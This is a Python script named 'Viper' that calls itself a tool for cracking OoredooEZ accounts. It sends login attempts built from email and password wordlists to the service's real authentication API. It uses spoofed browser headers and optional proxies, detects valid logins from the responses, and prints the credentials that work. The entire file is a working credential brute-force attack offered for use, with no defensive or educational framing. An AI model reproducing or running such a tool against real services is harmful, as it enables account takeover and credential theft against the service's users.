#########################################################
# Viper - OoredooEZ Accounts Cracking/Bruteforcing tool # 
# Author - edgerunner0x01                               #
#########################################################

try:
    from time import sleep
    from colorama import init , Style
    from colorama import Fore
    import requests
    import datetime
    import argparse
    import json
    red=str(Fore.RED)
    green=str(Fore.GREEN)
    yellow=str(Fore.MAGENTA)

except Exception as E:
    print("error: "+str(E))


class combo(): 
    def __init__(self):
        self.url=str("https://ooredoo.emberhub.gg/api/users/authenticate/password")
        self.headers={
            "Host": "ooredoo.emberhub.gg",
            "User-Agent": "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": "https://ooredoo.emberhub.gg/sign-in",
            "Content-Type": "application/json",
            "Content-Length": "63",
            "Origin": "https://ooredoo.emberhub.gg",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "TE": "trailers"
            }

    def guess(self,email,password,proxies):
        invalid_message='{"data":{"errors":[{"message":"Either the identifier or password were incorrect"}]}}'
        valid_message='"accessToken":'
        headers=self.headers
        payload={
                "identifier":email,
                "password":password
                }
        try:
            req=requests.post(self.url,json=payload,headers=headers,proxies=proxies)
            response=str(req.text)
            response_code=req.status_code
            if(response_code==400 and invalid_message in response):
                return False
            elif(response_code==200 and valid_message in response and (invalid_message not in response) ):
                return True
            else:
                return False

        except KeyboardInterrupt:
            exit()
        except Exception as e:
            print(f"{red}error: {e}")



    def check(self):
        try:
            req=requests.get(self.url)
            if req.status_code==200:
                return True
            else:
                return False

        except KeyboardInterrupt:
            pass
        except Exception as E:
            print(f"{red}error: {E}")

def check():
    attack=combo()
    print(f"{yellow}[!] Checking [SERVER] [{attack.url}] connectivity... ",end="")
    sleep(1)
    if(attack.check()):
        print(f"{green}[Done]")
        sleep(3)
    else:
        print(f"{red}Unknown Error !")
        exit()

def launch(email,password,proxies):

    try:
        attack=combo()
        guess=attack.guess(email,password,proxies)
    except KeyboardInterrupt:
        exit()
    except Exception as E:
        print("error: "+E)

    if(guess):
        print(green+"Found match for [{}:{}] !".format(email,password), end="")
        return True
        pass
    else:
        print(red+"No Match for [{}:{}] ".format(email,password),end="\r")
        return False

def banner():
    print("\n")
    banner="""\
         ██▒   █▓ ██▓ ██▓███  ▓█████  ██▀███
▓██░   █▒▓██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒
 ▓██  █▒░▒██▒▓██░ ██▓▒▒███   ▓██ ░▄█ ▒
  ▒██ █░░░██░▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄
   ▒▀█░  ░██░▒██▒ ░  ░░▒████▒░██▓ ▒██▒
   ░ ▐░  ░▓  ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
   ░ ░░   ▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░
     ░░   ▒ ░░░          ░     ░░   ░
      ░   ░              ░  ░   ░
     ░
                            [ Strike with Viper ]
                         [ Hunt OoredooEZ Accounts ]\n"""
    print(f"{green}{banner}")
    sleep(5)

def main():
    parser=argparse.ArgumentParser(description='Viper - Simple tool for cracking/bruteforcing OoredooEZ Accounts')
    parser.add_argument("EmailsList", type=str , help="Emails wordlist PATH ",metavar="<Emails:PATH>")
    parser.add_argument("PasswordsList", type=str , help="Passwords wordlist PATH ",metavar="<Passwords:PATH>")
    parser.add_argument("-x","--proxies", type=str , help="Proxies JSON file PATH ",metavar="<Proxies:PATH>")
    parser.add_argument("-v","--version", action="version" , help="Viper Version",version="Viper 1.0")
    args = parser.parse_args()

    emails_path=str(args.EmailsList)
    passwords_path=str(args.PasswordsList)
    proxies_path=str(args.proxies)


    banner()
    check()

    emails = []
    passwords = []
    proxies=None

    try:
        with open(emails_path,"r") as emails_file:
            print(f"{green}[+] Using [Emails] From [{emails_path}]")
            for email in emails_file:
                emails.append(email.replace("\n",""))
        sleep(2)
        with open(passwords_path,"r") as passwords_file:
            print(f"{green}[+] Using [Passwords] From [{passwords_path}]")
            for password in passwords_file:
                passwords.append(password.replace("\n",""))
        print("")
        if(proxies_path !=None and proxies_path!="None"):
            try:
                with open(proxies_path,"r") as proxies_file:
                    proxies_raw=proxies_file.read()
                    proxies_encoded=json.loads(proxies_raw)
                    proxies=proxies_encoded
                    print(f"{green}[+] Including [Proxies] ",end="\n\n")
                    sleep(1)
                    print(proxies_raw)
            
            except KeyboaderInterrupt:
                exit()
            except Exception as E:
                pass
                print(f"{red}[!] Invalid Proxies file path ")
                exit()
        else:
            proxies=None
            print(f"{red}[-] Not Including [Proxies] ")
            pass
    except KeyboardInterrupt:
        pass
    except Exception as E :
        print(f"{red}error: {E}")



    try:
        sleep(1)
        print(f"{yellow}[+] Launching [BruteForce] !\n")
        sleep(4)

        counter=1
        length=len(passwords)
        for email in emails:
            for password in passwords:
                time=datetime.datetime.now().strftime("%M:%S")
                print(f"{yellow}[#] [{time}] ({counter}/{length}) " ,end="")

                if(launch(email,password,proxies)):
                    counter=1
                    break
                else:
                    counter+=1
                    continue
            print("")
            counter=1

    except KeyboardInterrupt:
        exit()
    except Exception as E:
        print(red+"error: "+E)



if __name__=="__main__":
    init(autoreset=True)
    main()
